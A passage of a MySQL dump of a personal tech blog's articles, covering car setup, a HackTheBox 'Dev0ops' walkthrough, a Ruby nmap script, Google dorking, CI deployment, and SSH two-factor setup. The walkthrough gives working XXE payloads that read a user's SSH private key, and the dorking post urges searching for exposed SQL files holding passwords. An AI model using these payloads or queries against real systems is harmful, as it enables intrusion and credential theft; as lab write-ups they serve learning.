as fast speeds (fast suspension movements when going over bumps, kerbs, and similar undulations of the surface). In general, to improve road holding over bumps you will want to soften dampers up to the point that you get no more than one oscillation after a big bump. This means that the car goes to full compression during a bump, and then it can go to full extension before finally settling back to its normal ride height.</p>\r\n\r\n<h3 id=\"x400\">0x400: Aero</h3><hr/>\r\n<h4>Ride Height</h4>\r\n<p>This is the static or dynamic measure of a car chassis in relation to the ground.  It is usually measured from the lowest points on the car that will make contact with the ground first if the ride height is too low. Lowering the ride height will lower the center of gravity (CG) which reduces load transfer and increases grip. The lower the CG the faster the car will be, however at some point the car will start having issues with bottoming out on the track or start having issues with suspension.</p>\r\n<h4>Rear Wing &amp; Splitter</h4>\r\n<p>Higher wing/splitter angle with create more downforce, allowing a car to travel faster through a corner by increasing the vertical force on the tires, creating more grip, but at a cost to more drag which reduces straight line speed.</p>','gt3-setup-thumb.png','ACC,car,sim','no'),
	(19,'htb_dev0ops','HackTheBox: Dev0ops','2018-10-15','infosec','<p>The first box I\'ve ever done (Jerry doesn\'t count because it was piss easy) has been retired a few days ago, so now let\'s go through how I solved it.</p>\r\n\r\n<img class=\"img-responsive\" src=\"/common/static/img/dev0ops-nmap.png\" alt=\"image-alternative\">\r\n<p>The nmap scan shows it\'s running Gunicorn on port 5000. Web apps are always fun, and it\'s even using tech I\'ve dabbled in before. Anyway we should open it in a browser.</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/dev0ops-website.png\" alt=\"image-alternative\">\r\n<p>Not much to go on here apart from the fact that it\'s supposed to be a blog. Let\'s run gobuster on it to see if there is anything else.</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/dev0ops-gobuster.png\" alt=\"image-alternative\">\r\n<p>The scan hasn\'t completed yet but we\'ve already found some interesting urls so we can forget about it and leave gobuster in the background for now. <code>/feed</code> is just the image at the bottom of the main page you see up top, the important one is <code>/upload</code>.</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/dev0ops-upload.png\" alt=\"image-alternative\">\r\n<p>As you can see it\'s just a way to upload new posts as XML. Let\'s try and upload something. The format of the XML file is given to us as <code>Author</code>, <code>Subject</code>, and <code>Content</code>. Also note the capitalisation, which is actually important because it won\'t accept it with lowercase (I wasted over 30 mins trying to figure out why it wouldn\'t accept it). Here is our test XML (the name of the parent tag also doesn\'t matter):</p>\r\n<pre>\r\n&lt;file&gt;\r\n	&lt;Author&gt;test&lt;/Author&gt;\r\n	&lt;Subject&gt;test&lt;/Subject&gt;\r\n	&lt;Content&gt;test&lt;/Content&gt;\r\n&lt;/file>\r\n</pre>\r\n<img class=\"img-responsive\" src=\"/common/static/img/dev0ops-upload-test.png\" alt=\"image-alternative\">\r\n<p>So it just processes it and displays it back. It should be pretty obvious now that all we need to do is an XML injection to read the filesystem. We can get user.txt like this without ever having to actually access the server. This is the payload to use:</p>\r\n<pre>\r\n&lt;!DOCTYPE foo [\r\n	&lt;!ENTITY Subject ANY &gt;\r\n	&lt;!ENTITY xxe SYSTEM \"file:///home/roosa/user.txt\" &gt;\r\n]&gt;\r\n&lt;file&gt;\r\n	&lt;Author&gt;test&lt;/Author&gt;\r\n	&lt;Subject&gt;&amp;xxe;&lt;/Subject&gt;\r\n	&lt;Content&gt;test&lt;/Content&gt;\r\n&lt;/file>\r\n</pre>\r\n<p>Basically, we are creating an external entity named <code>xxe</code> which forces the XML parser to access the resource specified by the URI <b>\"file:///home/roosa/user.txt\"</b> which I got from the <b>\"File path:\"</b> field which is displayed when we uploaded our test XML.</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/dev0ops-user.png\" alt=\"image-alternative\">\r\n<p>Uploading it gives us user in the subject field.</p>\r\n\r\n<p>Now looking at files from the filesystem is neat and all, but it isn\'t going to give us root. We\'re definitely going to need to find a way to get a shell. The first thing I did was get <code>/etc/passwd</code> which was fine, but I was unable to get <code>/etc/shadow</code> presumably because the Gunicorn instance doesn\'t run as root, so my plan of cracking root\'s password was foiled.</p>\r\n\r\n<p>After a bit of thinking and looking at random files, I went back to the nmap scan saw <b><i>THE ANSWER</i></b>. Here is the new payload:</p>\r\n<pre>\r\n&lt;!DOCTYPE foo [\r\n	&lt;!ENTITY Subject ANY &gt;\r\n	&lt;!ENTITY xxe SYSTEM \"file:///home/roosa/.ssh/id_rsa\" &gt;\r\n]&gt;\r\n&lt;file&gt;\r\n	&lt;Author&gt;test&lt;/Author&gt;\r\n	&lt;Subject&gt;&amp;xxe;&lt;/Subject&gt;\r\n	&lt;Content&gt;test&lt;/Content&gt;\r\n&lt;/file>\r\n</pre>\r\n<p>Here we are just taking the user\'s SSH private key, so we should hopefully be able to sort of impersonate them and SSH into the box without a password.</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/dev0ops-sshkey.png\" alt=\"image-alternative\">\r\n<p>Nice! Now we can save it into a file and SSH into the box. But first we need to format it and then give the the correct permissions. I used <a href=\"https://www.samltool.com/format_privatekey.php\">this tool</a> to format the key and edited the permissions with (where <code>ssh_rsa</code> is our private key file):</p>\r\n<pre>\r\nchmod 700 ssh_rsa\r\n</pre>\r\n<p>This only gives root access to the file (which is us) because SSH requires that is is not editable by other users. Now we force SSH to use our private key file.</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/dev0ops-sshin.png\" alt=\"image-alternative\">\r\n<p>And we\'re in! Now for privesc.</p>\r\n\r\n<p>Normally the first thing I do when given shell is look at their bash history.</p>\r\n\r\n<img class=\"img-responsive\" src=\"/common/static/img/dev0ops-bash-history.png\" alt=\"image-alternative\">\r\n<p>Apart from using an inferior text editor (emacs was also being used further down), the thing that stands out the most is Git, which is also very familiar to me. The Git repository is in <code>~/work/blogfeed</code>, so let\'s go there and look at the Git logs with <code>git log</code>.</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/dev0ops-git-log.png\" alt=\"image-alternative\">\r\n<p>There\'s a very interesting commit there with the message \"reverted accidental commit with the proper key\". Could they be talking about the private key for root? Let\'s look at the commit before it (which should be the commit where the not \'proper key\' is added instead of deleted) with <code>git show &lt;commit_hash&gt;</code> where <b>commit_hash</b> is the commit\'s hash: d387abf63e05c9628a59195cec9311751bdb283f.</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/dev0ops-git-mistake.png\" alt=\"image-alternative\">\r\n\r\n<p>Look at that! It\'s a private key. Now to be completely clear, I have no idea if this is actually root - this is all total guess work, but let\'s try it anyway. Save it to a file, change the permissions, you know the rest.</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/dev0ops-root.png\" alt=\"image-alternative\">\r\n<p>It worked! You can find root.txt in <code>/root</code>.</p>','dev0ops-thumb.png','htb','no'),
	(20,'ruby_nmap_script','Writing A Simple Ruby Script To Automate Nmap','2018-10-29','development','<p>An nmap scan should always be the first thing to do when you start a box, and since I\'m too lazy to write <code>nmap -sV -sC -oA initial {{box_ip}}</code> (and I want a progress bar instead of having to constantly press a button to see progress), we\'re just going to write a script to do it for us.</p>\r\n\r\n<p>I\'m using Ruby for this because I think it\'s just as readable as Python (so I don\'t have to explain as much) and because I\'m not bothered to learn how to do this in Python, which means that this is the first time I\'ve ever shown code on this website that isn\'t Python.</p>\r\n\r\n<p>Anyway, to do this we will use <a href=\"https://ruby-doc.org/stdlib-2.4.1/libdoc/pty/rdoc/PTY.html\">a class from Ruby\'s standard library called PTY</a>. PTY allows you to spawn an external process and then interact with that process by using <code>puts</code> to write to it\'s <code>stdin</code> and gets to read from it\'s <code>stdout</code>.</p>\r\n\r\n<pre>\r\n#!/usr/bin/ruby\r\n\r\nrequire \'pty\'\r\ncmd = \"nmap -sV #{ARGV[0]}\"\r\n\r\nPTY.spawn( cmd ) do |stdout, stdin, pid|\r\n  loop do\r\n    stdin.puts \' \'\r\n    puts stdout.gets.chomp                                                                                                                                         \r\n    sleep 0.1\r\n  end\r\nend  \r\n</pre>\r\n\r\n<p>This is our initial code. It runs nmap with the box IP as an argument and every 0.1 seconds, it sends a space character to stdin and prints stdout so we can see the progress of the scan. This works but right now we are only running nmap with <code>-sV</code>, so now we should add all the arguments we need.</p>\r\n\r\n<pre>\r\n#!/usr/bin/ruby\r\n\r\nrequire \'pty\'\r\nrequire \'fileutils\'\r\n\r\nFileUtils.mkdir_p \'nmap\'\r\ncmd = \"nmap -sV -sC -oA nmap/initial #{ARGV[0]}\"\r\n\r\nPTY.spawn( cmd ) do |stdout, stdin, pid|\r\n  loop do\r\n    stdin.puts \' \'\r\n    puts stdout.gets.chomp\r\n\r\n    running = %x[ ps -p #{pid} -o comm= ]\r\n    if running.include? \"defunct\"\r\n      break\r\n    end\r\n                                                                                                                                  \r\n    sleep 0.1\r\n  end\r\nend  \r\n</pre>\r\n\r\n<p>Now we are creating a folder where all the nmap scripts will be stored using the library \'fileutils\' and we\'ve edited the \'cmd\' variable to use all the arguments. I\'ve also added a check to see if nmap has finshed in order to break out of the loop by checking if the process name includes the words \'defunct\'.</p>\r\n\r\n<p>If you run this you will see that stdout becomes very messy as the progress is constantly being called. Let\'s get that progress bar working.</p>\r\n\r\n<pre>\r\n#!/usr/bin/ruby\r\n\r\nrequire \'pty\'\r\nrequire \'fileutils\'\r\nrequire \'progress_bar\'\r\n\r\nFileUtils.mkdir_p \'nmap\'\r\ncmd = \"nmap -sV -sC -oA nmap/initial #{ARGV[0]}\"\r\n\r\n$syn_bar = ProgressBar.new\r\n$srv_bar = ProgressBar.new\r\n$nse_bar = ProgressBar.new\r\n\r\n$syn_progress = 0\r\n$srv_progress = 0\r\n$nse_progress = 0\r\n\r\n$step = \"init\"\r\n\r\ndef increment_bar(stdout)\r\n  new_status = stdout.match(/[[:digit:]]{1,2}\\.[[:digit:]]{2}/)\r\n  new_status ? new_status = new_status[0].to_i : return\r\n\r\n  if stdout.include? \"SYN Stealth Scan\"\r\n    if $step != \"syn\"\r\n      puts \"Step 1/3 [SYN Stealth Scan]\"\r\n      $step = \"syn\"\r\n    end\r\n\r\n    inc_amount = new_status - $syn_progress\r\n    $syn_progress = new_status\r\n    $syn_bar.increment! inc_amount\r\n  elsif stdout.include? \"Service\"\r\n    if $step != \"srv\"\r\n      puts \"Step 2/3 [Service Scan]\"\r\n      $step = \"srv\"\r\n    end\r\n\r\n    inc_amount = new_status - $srv_progress\r\n    $srv_progress = new_status\r\n    $srv_bar.increment! inc_amount\r\n  elsif stdout.include? \"NSE Timing\"\r\n    if $step != \"nse\" && $step != \'init\'\r\n      # NSE Timing shows up before it actually begins\r\n      puts \"Step 3/3 [NSE]\"\r\n      $step = \"nse\"\r\n    end\r\n\r\n    inc_amount = new_status - $nse_progress\r\n    $nse_progress = new_status\r\n    $nse_bar.increment! inc_amount\r\n  end\r\nend\r\n\r\nPTY.spawn( cmd ) do |stdout, stdin, pid|\r\n  loop do\r\n    stdin.puts \' \'\r\n    response = stdout.gets.chomp\r\n\r\n    increment_bar(response)\r\n\r\n    running = %x[ ps -p #{pid} -o comm= ]\r\n    if running.include? \"defunct\"\r\n      break\r\n    end\r\n\r\n    sleep 0.1\r\n  end\r\nend\r\n</pre>\r\n\r\n<p>This is a really quick and dirty way of getting a progress bar using the library \'progress_bar\'. Make sure to install it with: </p>\r\n<pre>\r\ngem install progress_bar\r\n</pre>\r\n<p>Obviously I\'m not super proud this script, it\'s actually pretty terrible for my standards, so much so that I don\'t want to explain it. But it does what I wanted it to and only took me 5 minutes to write. Someday I may comeback to it to clean up all the repeating code and stop using so many global variables (but I say that about all the code I write, so whatever).</p>\r\n\r\n<p>Now I can move save this as <code>/opt/scan-box</code> and call it with <code>/opt/scan-box {{box_ip}}</code>. You could also put it in <code>/bin</code> so you can call it with just <code>scan-box {{box_ip}}</code>, but I don\'t like doing that.</p>','ruby-nmap.png','ruby,nmap','no'),
	(21,'google_hacking','Google Hacking For Fun And For Profit','2018-11-08','infosec','<p>Google Hacking (or Google Dorks) can be very useful when gathering information on a business as it is essentially a way to use the search engine to pinpoint websites that have certain flaws, vulnerabilities, and sensitive information that can be taken advantage of. Google offers the opportunity to perform advanced search queries using special operators. Beyond the common operators (AND, OR, +, -, “”) there are more specific filters that you can use.</p>\r\n\r\n<img class=\"img-responsive\" src=\"/common/static/img/google-search.png\" alt=\"image-alternative\">\r\n<p>If you constantly look up code error messages on Google like me, you\'ve more than likely come across a Google Dork when clicking the <i>\'more results from stackoverflow.com\'</i> which changes the search term to this.</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/google-dork-search.png\" alt=\"image-alternative\">\r\n<p>Basically it\'s just added <code>site:stackoverflow.com</code> to the search query which means that it will limit all the results to only those from the given website. There are far more operators, too many to include in this guide, but I\'ll go over some of the most common:</p>\r\n<ul>\r\n<li><b>cache</b>: will show the cached content of the specific website.</li>\r\n<li><b>link</b>: will display websites that have links to the specific website.</li>\r\n<li><b>site</b>: limits the search results to the website given.</li>\r\n<li><b>filetype</b>:  searches for all documents with a specific extension.</li>\r\n<li><b>ext</b>: very similar to filetype, but this looks for files based on their file extension.</li>\r\n<li><b>intext</b>: searches the entire content of a given page for keywords supplied.</li>\r\n<li><b>allintext</b>: similar to the previous operator, but requires a page to match all of the given keywords.</li>\r\n</ul>\r\n\r\n<p>You can also prepend a hyphen to all of these (except cache) to exclude the filter instead. E.g <code>-site:www.site.com</code> will exclude all results from site.com.</p>\r\n\r\n<p>Now let\'s look at another example. We will be looking for PDFs on the docker site by searching <code>site:www.docker.com filetype:pdf</code></p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/google-docker.png\" alt=\"image-alternative\">\r\n<p>When used correctly, Google Dorks can uncover some incredible information such as email addresses and lists, login credentials, sensitive files, website vulnerabilities, and even financial information (e.g. payment card data).</p>\r\n\r\n<p>One Google Dork I particularly enjoy is <code>inurl:org AND filetype:sql AND intext:password</code>. I won\'t show you a picture of it in action (because it includes sensitive data), so you should just go and search it yourself. If you look long enough, you may find some very interesting results...</p>\r\n\r\n<p>For more queries, you can look at the links below.</p>\r\n<ul>\r\n<li><a href=\"https://www.exploit-db.com/google-hacking-database/\">Exploit DB: GHDB</a></li>\r\n<li><a href=\"http://www.google-dorking.com/\">Google Dorking</a></li>\r\n</il>','google-thumb.png','google','no'),
	(22,'auto_deploy_with_travis_ci','Auto Deploying WIth Travis CI And SSH','2018-11-18','development','<p>For the past few days I\'ve been working on getting auto deployment with Travis CI for this website. If you didn\'t know already, I write these articles on a localhost server and export a SQL dump to the production server. Now all I would need to do is push the dump in the Git commit  and it should import it automatically (as long as all the tests succeed). Anyway, here\'s how to set it up.</p>\r\n\r\n<p>This is the process we will have to go through:</p>\r\n<ul>\r\n<li>Set up SSH keys.</li>\r\n<li>Add the server\'s copy of the repository as a Git remote.</li>\r\n<li>Push to the remote.</li>\r\n<li>SSH into the server and import the SQL dump.</li>\r\n</ul>\r\n\r\n<h3>A Quick Note On Security And Sensitive Information</h3>\r\n<p>Connecting from a Travis build box (or any CI system really) to a remote host implies to have the private SSH key on the CI box (*_rsa files) and its associated public SSH key on the remote host end (*_rsa.pub files). We need to make sure our private key is never seen in the Git repo or in the build logs. Thankfully, the Travis CLI client supports file encryption, so make sure to <a href=\"https://github.com/travis-ci/travis.rb#installation\">install it</a> so we can encrypt it before pushing it to the repo.</p>\r\n\r\n<p>Git also recommends using a separate <code>git</code> user for remote interactions. However, your repositories might be under a separate user (<code>apps</code>, for example), so you\'ll need to add both those users to a group (<code>deploy</code>, for example). <a href=\"https://git-scm.com/book/en/v2/Git-on-the-Server-Setting-Up-the-Server\">Here\'s a guide on how to do that.</a></p>\r\n\r\n<h3>SSH keypair</h3>\r\n<p>Generate a dedicated SSH key (it is easier to isolate and to revoke).</p>\r\n<pre>\r\nssh-keygen -t rsa -b 4096 -C \'build@travis-ci.org\' -f ./deploy_rsa\r\n</pre>\r\n<p>Press the <code>[Enter]</code> key to use the defaults for the filename and leave the password blank.</p>\r\n<p>Having a RSA key without a password is \"OK\" for use as a key exclusively used for deployment on Travis-CI because the key will be encrypted using Travis\' public key meaning that only Travis can decrypt it. Given that we are \"trusting\" Travis-CI with the private key there is not much point adding password to it, because the password can easily be \"stripped\" once the key is decrypted. and, given that Travis needs to \"know\" the password in order to use the key. If an \"attacker\" was to gain access to Travis\' system and had their private key, the Internet would \"break\"! seriously, enough NPM packages are automatically published by Travis-CI that it would be \"left-pad gate\" times a million if Travis were compromised!</p>\r\n\r\n<p>Now encrypt the private key to make it readable only by Travis CI (so as we can commit safely too!).</p>\r\n<pre>\r\ntravis encrypt-file deploy_rsa --add\r\n</pre>\r\n\r\n<p>Copy the public key onto the remote SSH host.</p>\r\n<pre>\r\nssh-copy-id -i deploy_rsa.pub &lt;ssh-user&gt;@&lt;deploy-host&gt;\r\n</pre>\r\n<p>If you have both <code>git</code> and <code>apps</code> users, make sure to do it for both of them.</p>\r\n\r\n<p>Remove the un-encrypted private key file (the public key is mostly okay to push).</p>\r\n<pre>\r\nrm -f deploy_rsa\r\n</pre>\r\n\r\n<p>Stage the modified files into Git.</p>\r\n<pre>\r\ngit add deploy_rsa.enc deploy_rsa.pub\r\n</pre>\r\n\r\n<h3>Remote Git Repository</h3>\r\n<p>Assuming you already have your Git repository cloned onto the remote server, the next step is to configure it to allow pushes. Run this to allow Git to accept pushes to a remote with a clean working tree. </p>\r\n<pre>git config --local receive.denyCurrentBranch updateInstead</pre> \r\n<p>If you\'re using CentOS 7, you may also need to update Git to <code>&gt;2.14</code> as previous versions do not support <code>receive.denyCurrentBranch updateInstead</code>.</p>\r\n<p>Once you\'ve done that, make sure that the user and the group can access and modify the repository folder\'s contents.</p>\r\n<pre>\r\nchown apps:deploy -R &lt;repo&gt;\r\nchmod g+rw -R &lt;repo&gt;\r\n</pre>\r\n\r\n<h3>Configuring Travis</h3>\r\n<p>This part can change by quite a bit depending on what you want to do, so I\'ll just show you what I did. In our <code>.travis.yml</code> we will add these lines.</p>\r\n<pre>\r\ndeploy:\r\n  provider: script\r\n  skip_cleanup: true\r\n  script: deploy/deploy.sh\r\n  on:\r\n    branch: master\r\n</pre>\r\n<p>This will run the script <code>deploy/deploy.sh</code> which looks like this.</p>\r\n<pre>\r\n#!/bin/bash\r\n\r\ngit config --global push.default matching\r\ngit remote add deploy ssh://git@$IP:$PORT$DEPLOY_DIR\r\ngit push deploy master\r\n\r\nssh apps@$IP -p $PORT &lt;&lt;EOF\r\n  cd $DEPLOY_DIR\r\n  mysql -u $DB_USER -p$DB_PASS blog &lt; migrations/articles.sql\r\nEOF\r\n</pre>\r\n\r\n<p>Once you\'re done with the deploy script, push it to your repository and enable Travis integration for it. The next step is to add environment variables to Travis to keep your IP, SSH port, and deploy directory secret. In the Travis menu, select your repository, click \"More options\", and click \"Settings\". Scroll down until you see the list of environment variables. There should be some already there that were added by the Travis CLI in the form encrypted_[hex string]_iv/key. Leave those alone. Add <code>IP</code>, <code>PORT</code>, and <code>DEPLOY_DIR</code> as well as <code>DB_USER</code> and <code>DB_PASS</code> (if you need them) as variables with their corresponding values. For full security, do not display these values in the build log. Once you\'ve finished that, you\'re done!</p>','travis.png','travisci,blogpost','no'),
	(23,'dark_mode','Saving The World One Dark Mode Setting At A Time','2018-12-03','development','<p>According to very reputable <a href=\"https://en.wikipedia.org/wiki/List_of_sauces\" target=\"_blank\" rel=\"noopener\">sources</a>, light mode displays in software are actually the leading cause in climate change. It has also been proven that people who use light mode have a much lower IQ because the brightness of the screen burns their brain cells away and that\'s how science works I think. If you disagree with this, you are cyber bullying me and I will report you to ASIO.</p>\r\n\r\n<p>Anyway, now you must be wondering why my blog looks like this.</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/dark-mode-no.png\" alt=\"image-alternative\">\r\n<p>And that\'s because I haven\'t been bothered to change any of the CSS from the Bootstrap template I bought.</p>\r\n<p>But I\'ve decided that I\'ve had enough! I\'ve gotten off my lazy ass and immediately sat back down (because who codes standing up?) to spends HOURS* to add a dark mode to this website for you, my dear reader!<br>\r\n<span style=\"font-size: 9px;\">*10 minutes of code, 3 hours of cat videos</span>\r\n</p>\r\n\r\n<p>Now your eyes will be saved from the global warming, IQ destroying tyranny of light modes by just pressing the <code>Dark Mode</code> button at the bottom of the page.</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/dark-mode-button.png\" alt=\"image-alternative\">\r\n<p>Now look at it... beautiful.</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/dark-mode-yes.png\" alt=\"image-alternative\">\r\n<p>And in case you wanted it. Here\'s the code.</p>\r\n<pre>\r\nif(theme === \"dark\") {\r\n    $(\"head\").append(\'&lt;link rel=\"stylesheet\" href=\"/common/static/css/dark-override.css\"&gt;\');\r\n    $(\'#ToggleTheme\').text(\'Light Mode\');\r\n}\r\n\r\n$(\'#ToggleTheme\').click(function() {\r\n    if(theme !== \"dark\") { localStorage.setItem(\'theme\', \'dark\'); }\r\n    else                 { localStorage.setItem(\'theme\', \'light\'); }\r\n\r\n    location.reload();\r\n});\r\n</pre>','dark-mode-thumb.png','blogpost','no'),
	(24,'vm_labo','I Put A Bunch Of VMs Together And Call It A Lab','2018-12-14','infosec','<p>During the past few days, I\'ve been setting up virtual machines to use for demonstrations on this blog. It\'s very basic, two Windows boxes and a Linux server and although I originally wanted a Windows server as well, those plans where short lived after I saw the price for a license.</p>\r\n\r\n<p>All of the VMs are stored on a 250GB external SSD (because my MacBook has zero space on it) and are accessed from VMware Fusion disconnected from the internet and in a virtual private network.</p>\r\n\r\n<p>While the configuration and firewall/anti-virus stuff will constantly change, I\'ll probably mainly only use this for malware analysis so I\'ve pre-installed some software to use. On the Windows boxes, there\'s Python and a debugger, and on the Linux box I\'ve installed INetSim to simulate common internet services and Wireshark (you should know what this does). Just realising now that I should also give it a Samba share...</p>\r\n\r\n<p>I\'ve also created another box in the network to carry out any pen testing I may do. It runs Parrot OS as opposed to Kali (hence the thumbnail). I\'ve never touched it before this, so I\'m intrigued to see how it differs to Kali. If it\'s not much of a pain, I may also consider switching my main pen testing VM to Parrot.</p>\r\n\r\n<p>Anyway here\'s the list of boxes with their OS, static IP, and host name in that order:</p>\r\n\r\n<ul>\r\n<li>Windows 7 x86 - 192.168.1.70 - RIOTDIVISION</li>\r\n<li>Windows 10 x64 - 192.168.1.50 - ROSEN</li>\r\n<li>Lubuntu 10.14 x64 - 192.168.1.100 - ANDWANDER</li>\r\n<li>Parrot 4.4 x64 - 192.168.1.20 - ACRONYM</li>\r\n</ul>\r\n\r\n<p>And yes, I did name them after clothing companies. What did you expect? This is a fashion blog after all.</p>','labo.png','vm,lab','no'),
	(25,'mfa_for_centos_ubuntu','Adding 2FA For CentOS/Ubuntu Servers','2019-01-22','development','<p>This is a quick guide to set up two-factor authentication on CentOS/Ubuntu servers. By quick, I mean that I\'m not going to explain much. I\'m only writing this because I feel bad that I haven\'t made a post in over a month.</p>\r\n\r\n<p>For this guide, we will be using the Google Authenticator app which you can download on your phone, although I think the PAM (Pluggable Authentication Module) also generates TOTPs compatible with Authy. So make sure you have one of those installed first.</p>\r\n\r\n<p>Okay let\'s get started.</p>\r\n\r\n<h3>Install Google\'s PAM</h3>\r\n<p>On CentOS:</p>\r\n<pre>\r\n# Add the EPEL repo (if you haven\'t already)\r\n$ sudo yum install https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm\r\n# Install PAM\r\n$ sudo yum install google-authenticator\r\n</pre>\r\n<p>On Ubuntu:</p>\r\n<pre>\r\n$ sudo apt-get install libpam-google-authenticator\r\n</pre>\r\n\r\n<p>Now run the initialisation app:</p> \r\n<pre>$ google-authenticator</pre>\r\n<p>You\'ll be asked a few questions. I forgot what they where, so you\'re on your own with this, just read them and you\'ll probably be fine. After the first question a lot of output will scroll past, including a large QR code. At this point, use your authenticator app on your phone to scan the QR code or manually type in the secret key. Make sure you also record the secret key, verification code, and the recovery codes in a safe place.</p>\r\n\r\n<h3>Configuring SSH</h3>\r\n<p>Open <code>/etc/pam.d/sshd</code> in the only good editor:</p>\r\n<pre>\r\n$ sudo vim /etc/pam.d/sshd\r\n</pre>\r\n<p>And add this line to the bottom:</p>\r\n<pre>\r\n...\r\nauth required pam_google_authenticator.so \r\n</pre>\r\n<p>Now we need to configure SSH to support the authentication, open <code>/etc/ssh/sshd_config</code>:</p>\r\n<pre>\r\n$ sudo vim /etc/ssh/sshd_config\r\n</pre>\r\n<p>Look for the <code>ChallengeResponseAuthentication</code> line. Change it from <code>no</code> to <code>yes</code>:</p>\r\n<pre>\r\n...\r\n# Change to no to disable s/key passwords\r\n#ChallengeResponseAuthentication no\r\nChallengeResponseAuthentication yes\r\n...\r\n</pre>\r\n\r\n<p>Restart SSH:</p>\r\n<pre>\r\n$ sudo systemctl restart sshd.service\r\n</pre>\r\n\r\n<p>Now we can test if it works, open a new terminal session and attempt to SSH into it. If you don\'t use SSH keys, you\'re an idiot, but it should prompt for a verification code after you enter the password. If you\'re smart and previously created an SSH key, you\'ll notice you didn\'t have to type a verification code. This is because an SSH key overrides all other authentication options by default.</p>\r\n\r\n<p><b>The Next Part</b> will go through changing that to set up an SSH key as one factor and the verification code as a second.</p>\r\n\r\n<h3>The Next Part</h3>\r\n<p>Open the <code>sshd</code> config file again and add the following line to the bottom: </p>\r\n<pre>\r\n...\r\nAuthenticationMethods publickey,password publickey,keyboard-interactive\r\n</pre>\r\n<p>Next, open the <code>PAM sshd</code> configuration file again. On CentOS, comment out this line:</p>\r\n<pre>\r\n...\r\n#@include common-auth\r\n...\r\n</pre>\r\n<p>On Ubuntu, comment out this line:</p>\r\n<pre>\r\n...\r\n#auth       substack     password-auth\r\n...\r\n</pre>\r\n\r\n<p>Now, restart the SSH service and test it again. If it all works, you should now call me your saviour who prevented you from getting hacked and losing millions of dollars because your developers have no idea what they\'re doing and setup their enterprise systems by following guides from shitty blogs.</p>\r\n<p>You\'re welcome.</p>\r\n<p><b>Update 22/01/19:</b> My TravisCI deployment script was messed up because of this. But it was an easy fix, just <a href=\"https://askubuntu.com/questions/864986/disable-pam-module-for-group\">disable PAM for the user group TravisCI used.</a></p>','2fa-thumb.png','2fa,centos,ubuntu','no');

/*!40000 ALTER TABLE `Articles` ENABLE KEYS */;
UNLOCK TABLES;



/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
